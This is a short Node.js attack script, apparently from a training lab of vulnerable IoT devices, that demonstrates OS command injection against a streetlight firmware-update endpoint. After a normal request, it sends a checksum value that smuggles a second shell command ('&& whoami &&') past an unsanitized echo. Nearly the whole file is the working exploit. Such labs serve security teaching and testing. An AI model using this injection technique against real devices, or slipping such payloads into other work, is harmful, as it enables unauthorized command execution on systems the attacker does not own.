/**
 * Attack 3: OS command injection
 * Target: streetlight device (V1 - unsanitized checksum in shell command)
 * Demonstrates breaking out of the intended "echo" command to run another one.
 */
const axios = require("axios");

const BASE = process.env.STREETLIGHT_URL || "http://localhost:4003";

async function main() {
  console.log("== Baseline: legitimate-looking update ==");
  const normal = await axios.post(`${BASE}/api/firmware/update`, {
    version: "2.3.1",
    checksum: "a1b2c3d4"
  });
  console.log("Normal response:", normal.data);

  console.log("\n== Injection payload in checksum field ==");
  const payload = `abc123" && whoami && echo "done`;
  const injected = await axios.post(`${BASE}/api/firmware/update`, {
    version: "2.3.1",
    checksum: payload
  });
  console.log("Injected response (look for command output beyond the checksum):");
  console.log(injected.data);
}

main().catch(e => console.error("Attack failed:", e.response?.data || e.message));
